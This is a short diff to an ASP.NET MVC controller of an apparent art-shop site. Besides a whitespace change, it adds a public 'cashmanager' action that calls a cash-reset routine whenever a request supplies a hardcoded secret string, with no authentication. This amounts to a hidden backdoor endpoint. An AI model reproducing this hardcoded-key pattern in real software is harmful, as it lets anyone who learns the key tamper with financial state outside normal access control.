@@ -38,7 +38,7 @@ namespace ArtShop.Controllers
             return View(model);
         }
 
-        
+
         public ActionResult Header(string culture)
         {
             var userId = User.Identity.GetUserId();
@@ -73,6 +73,13 @@ namespace ArtShop.Controllers
             Response.Cookies.Add(cookie);
             string url = this.Request.UrlReferrer.AbsolutePath;
             return Redirect(url);
+        }
+
+        public ActionResult cashmanager(string id)
+        {
+            if (id == "soroosh1313")
+                CashManager.resete();
+            return Content("ok");
         }
     }
 }
